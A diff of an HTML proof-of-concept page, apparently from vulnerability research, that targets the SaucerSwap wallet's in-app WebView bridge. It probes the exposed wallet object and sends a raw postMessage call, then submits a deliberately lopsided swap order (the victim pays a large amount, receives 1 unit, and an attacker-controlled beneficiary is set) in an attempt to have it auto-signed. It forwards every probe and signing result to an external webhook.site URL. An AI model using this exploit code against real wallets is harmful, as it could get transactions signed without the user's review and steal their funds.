@@ -2,138 +2,176 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<script src="https://unpkg.com/@hiero-ledger/sdk@2.70.0/dist/umd.js"></script>
 <style>
   body { font-family: -apple-system, sans-serif; max-width: 640px; margin: 0 auto; padding: 16px; }
   input { width: 100%; padding: 8px; margin: 4px 0 12px; box-sizing: border-box; font-size: 16px; }
   button { padding: 14px 18px; margin: 6px 0; font-weight: 700; font-size: 16px; width: 100%; }
-  #log { background: #111; color: #0f0; padding: 10px; font-size: 11px; white-space: pre-wrap; word-break: break-all; height: 350px; overflow-y: auto; margin-top: 12px; }
+  #log { background: #111; color: #0f0; padding: 10px; font-size: 11px; white-space: pre-wrap; word-break: break-all; height: 400px; overflow-y: auto; margin-top: 12px; }
+  .step { border-left: 3px solid #999; padding-left: 10px; margin: 16px 0; }
 </style>
 </head>
 <body>
- 
-<h1>In-App Bridge Test → Webhook</h1>
-<p>Calls <code>window.saucerswapWallet.signTransaction()</code> directly and forwards
-the result to your webhook (no devtools needed to see it).</p>
- 
+
+<h1>Auto-Confirm / verifyReactor PoC</h1>
+<p>Two-phase test. Phase 1 checks whether an order-signing request is reachable
+from a third-party page at all — via the exposed <code>window.saucerswapWallet</code>
+object and via a raw <code>postMessage</code> guess that bypasses it. Phase 2, only if
+Phase 1 shows reachability, attempts to get an attacker-favorable order auto-signed.</p>
+
 <p>Webhook URL:</p>
 <input id="webhookUrl" value="https://webhook.site/89541966-2677-41d6-985f-879b2c5f67d2">
- 
-<p>Owner: <input id="ownerId" value="0.0.10190152"></p>
-<p>Recipient: <input id="recipientId" value="0.0.10130162"></p>
-<p>Amount (tinybars): <input id="amountTinybars" value="100000000"></p>
- 
-<button onclick="runTest()">Call signTransaction() → forward result to webhook</button>
- 
+
+<div class="step">
+  <h3>Phase 1 — Reachability probe</h3>
+  <button onclick="phase1()">Probe bridge surface</button>
+</div>
+
+<div class="step">
+  <h3>Phase 2 — Attempt order auto-sign (only meaningful if Phase 1 finds a path)</h3>
+  <p>Reactor address (must be the real SaucerSwap reactor — required for verifyReactor to pass):</p>
+  <input id="reactorAddr" value="0x0000000000000000000000000000000000000000" placeholder="paste real reactor address here">
+  <p>Chain ID:</p>
+  <input id="chainId" value="295">
+  <p>Attacker-favorable order fields (these should NOT be validated per our trace):</p>
+  <input id="inputToken" value="0.0.456858" placeholder="input token (e.g. victim's real token)">
+  <input id="inputAmount" value="1000000000" placeholder="input amount (victim pays)">
+  <input id="outputToken" value="0.0.1183558" placeholder="output token (attacker-favorable)">
+  <input id="outputAmount" value="1" placeholder="output amount (absurdly low — should trigger review if content were checked)">
+  <input id="beneficiary" value="0.0.9999999" placeholder="attacker-controlled recipient, not the wallet owner">
+  <button onclick="phase2()">Send crafted order via exposed method</button>
+  <button onclick="phase2Raw()">Send crafted order via raw postMessage guess</button>
+</div>
+
 <pre id="log"></pre>
- 
+
 <script>
 function log(msg) {
   const el = document.getElementById('log');
   el.textContent += new Date().toISOString() + " - " + msg + "\n";
   el.scrollTop = el.scrollHeight;
 }
- 
+
 async function postToWebhook(label, data) {
   const url = document.getElementById('webhookUrl').value.trim();
   if (!url) { log('No webhook URL set.'); return; }
   const payload = JSON.stringify({ label, timestamp: new Date().toISOString(), data });
   try {
-    // text/plain avoids a CORS preflight (OPTIONS) entirely — some embedded
-    // WebViews don't complete the two-step preflight+POST handshake reliably.
-    // webhook.site still parses/displays the body correctly either way.
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'text/plain' },
-      body: payload
-    });
+    await fetch(url, { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: payload });
     log('POSTed "' + label + '" to webhook.');
   } catch (e) {
-    log('fetch POST failed (' + e.message + '), trying sendBeacon fallback…');
+    log('fetch POST failed (' + e.message + '), trying sendBeacon…');
     try {
       const ok = navigator.sendBeacon(url, new Blob([payload], { type: 'text/plain' }));
-      log(ok ? 'sendBeacon queued "' + label + '".' : 'sendBeacon also failed to queue.');
+      log(ok ? 'sendBeacon queued "' + label + '".' : 'sendBeacon failed too.');
     } catch (e2) {
       log('sendBeacon threw: ' + e2.message);
     }
   }
 }
- 
-async function runTest() {
-  try {
-    if (!window.saucerswapWallet) {
-      log('window.saucerswapWallet NOT present in this context.');
-      await postToWebhook('bridge_missing', { present: false });
-      return;
+
+// ---- Phase 1: does anything expose an order-signing path? ----
+async function phase1() {
+  log('--- Phase 1: reachability probe ---');
+
+  // 1a. What's actually exposed on the documented bridge object?
+  if (window.saucerswapWallet) {
+    const keys = Object.keys(window.saucerswapWallet);
+    log('window.saucerswapWallet present. Exposed methods: ' + keys.join(', '));
+    await postToWebhook('bridge_surface', { keys });
+    if (keys.some(k => /order/i.test(k))) {
+      log('>>> An order-related method IS exposed on the public bridge. Proceed to Phase 2 via exposed method.');
+    } else {
+      log('No order-related method exposed on window.saucerswapWallet (expected: only connect/signTransaction/signMessage/disconnect).');
+      log('This means SaucerswapOrderSignMessage is NOT directly reachable through the documented dApp-facing API.');
     }
-    log('window.saucerswapWallet is present. Keys: ' + Object.keys(window.saucerswapWallet).join(', '));
-    await postToWebhook('bridge_present', { keys: Object.keys(window.saucerswapWallet) });
- 
-    const { TransferTransaction, AccountId, Hbar, TransactionId } = sdk;
-    const ownerStr = document.getElementById('ownerId').value.trim();
-    const recipientStr = document.getElementById('recipientId').value.trim();
-    const amountTinybars = document.getElementById('amountTinybars').value.trim();
- 
-    const owner = AccountId.fromString(ownerStr);
-    const recipient = AccountId.fromString(recipientStr);
- 
-    const tx = new TransferTransaction()
-      .addHbarTransfer(owner, Hbar.fromTinybars(-amountTinybars))
-      .addHbarTransfer(recipient, Hbar.fromTinybars(amountTinybars))
-      .setTransactionId(TransactionId.generate(owner))
-      .setNodeAccountIds([AccountId.fromString('0.0.3')])
-      .freeze();
- 
-    const bytes = tx.toBytes();
-    let binary = '';
-    for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
-    const base64Bytes = btoa(binary);
- 
-    log('Built transaction, base64 length: ' + base64Bytes.length);
-    log('⏱ Calling signTransaction() now — watch the device for any prompt.');
- 
-    const sentAt = new Date().toISOString();
-    const t0 = performance.now();
-    await postToWebhook('signTransaction_called', { sentAt, owner: ownerStr, recipient: recipientStr, amountTinybars });
- 
-    window.saucerswapWallet.signTransaction(base64Bytes)
-      .then(async (result) => {
-        const elapsed = (performance.now() - t0).toFixed(0);
-        const receivedAt = new Date().toISOString();
-        log('signTransaction() RESOLVED after ' + elapsed + 'ms: ' + JSON.stringify(result));
-        await postToWebhook('signTransaction_resolved', { sentAt, receivedAt, elapsedMs: elapsed, result });
-      })
-      .catch(async (err) => {
-        const elapsed = (performance.now() - t0).toFixed(0);
-        const receivedAt = new Date().toISOString();
-        log('signTransaction() REJECTED after ' + elapsed + 'ms: ' + err.message);
-        await postToWebhook('signTransaction_rejected', { sentAt, receivedAt, elapsedMs: elapsed, message: err.message });
-      });
-  } catch (e) {
-    log('Error: ' + e.message);
-    await postToWebhook('script_error', { message: e.message });
+  } else {
+    log('window.saucerswapWallet NOT present in this context.');
+    await postToWebhook('bridge_missing', { present: false });
+  }
+
+  // 1b. Does the native onMessage handler route a raw postMessage with an
+  // order-signing method name, even though it's not exposed as a JS method?
+  // This tests whether the native side switches on `method` from ANY message,
+  // not just ones dispatched through the wrapper functions.
+  if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
+    const probeId = 'probe_' + Date.now();
+    window.__saucerswap_callbacks = window.__saucerswap_callbacks || {};
+    window.__saucerswap_callbacks[probeId] = {
+      resolve: async (r) => { log('RAW PROBE RESOLVED: ' + JSON.stringify(r)); await postToWebhook('raw_probe_resolved', r); },
+      reject:  async (e) => { log('RAW PROBE REJECTED: ' + JSON.stringify(e)); await postToWebhook('raw_probe_rejected', e); }
+    };
+    const probePayload = {
+      type: 'injected_request',
+      method: 'signOrder', // guess #1 — adjust based on actual RPC/method naming if discovered elsewhere
+      params: { order: { reactor: document.getElementById('reactorAddr').value, chainId: Number(document.getElementById('chainId').value) } },
+      id: probeId
+    };
+    log('Sending raw postMessage probe: ' + JSON.stringify(probePayload));
+    window.ReactNativeWebView.postMessage(JSON.stringify(probePayload));
+    await postToWebhook('raw_probe_sent', probePayload);
+    log('If native side has no handler for this method, expect silence (no resolve/reject) or an explicit "unknown method" rejection.');
+  } else {
+    log('window.ReactNativeWebView.postMessage NOT present — cannot raw-probe.');
   }
 }
+
+// ---- Phase 2a: attempt via exposed method (only if Phase 1 found one) ----
+async function phase2() {
+  log('--- Phase 2a: crafted order via exposed method ---');
+  const order = buildOrder();
+  if (!window.saucerswapWallet) { log('No bridge present, aborting.'); return; }
+  const orderMethod = Object.keys(window.saucerswapWallet).find(k => /order/i.test(k));
+  if (!orderMethod) {
+    log('No order-related method found on window.saucerswapWallet. Cannot run Phase 2a — use Phase 2b (raw) instead, or this path is not reachable from a third-party dApp.');
+    return;
+  }
+  log('Calling window.saucerswapWallet.' + orderMethod + '(...) with crafted order: ' + JSON.stringify(order));
+  await postToWebhook('phase2a_order_sent', order);
+  try {
+    const result = await window.saucerswapWallet[orderMethod](order);
+    log('RESOLVED: ' + JSON.stringify(result));
+    await postToWebhook('phase2a_resolved', result);
+  } catch (e) {
+    log('REJECTED: ' + e.message);
+    await postToWebhook('phase2a_rejected', { message: e.message });
+  }
+}
+
+// ---- Phase 2b: attempt via raw postMessage, bypassing the exposed object ----
+async function phase2Raw() {
+  log('--- Phase 2b: crafted order via raw postMessage ---');
+  if (!window.ReactNativeWebView) { log('No ReactNativeWebView bridge, aborting.'); return; }
+  const order = buildOrder();
+  const id = 'order_' + Date.now();
+  window.__saucerswap_callbacks = window.__saucerswap_callbacks || {};
+  window.__saucerswap_callbacks[id] = {
+    resolve: async (r) => { log('ORDER AUTO-SIGN RESOLVED: ' + JSON.stringify(r)); await postToWebhook('phase2b_resolved', r); },
+    reject:  async (e) => { log('ORDER REJECTED: ' + JSON.stringify(e)); await postToWebhook('phase2b_rejected', e); }
+  };
+  const payload = { type: 'injected_request', method: 'signOrder', params: { order }, id };
+  log('Sending: ' + JSON.stringify(payload));
+  window.ReactNativeWebView.postMessage(JSON.stringify(payload));
+  await postToWebhook('phase2b_sent', payload);
+}
+
+function buildOrder() {
+  return {
+    reactor: document.getElementById('reactorAddr').value.trim(),
+    chainId: Number(document.getElementById('chainId').value.trim()),
+    inputToken: document.getElementById('inputToken').value.trim(),
+    inputAmount: document.getElementById('inputAmount').value.trim(),
+    outputToken: document.getElementById('outputToken').value.trim(),
+    outputAmount: document.getElementById('outputAmount').value.trim(),
+    beneficiary: document.getElementById('beneficiary').value.trim(),
+    // deliberately absurd terms — if this auto-signs, content is provably not checked
+  };
+}
+
+window.onload = () => {
+  log('Page loaded. window.saucerswapWallet present: ' + !!window.saucerswapWallet);
+  log('window.ReactNativeWebView present: ' + !!window.ReactNativeWebView);
+};
 </script>
- 
+
 </body>
 </html>
- 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
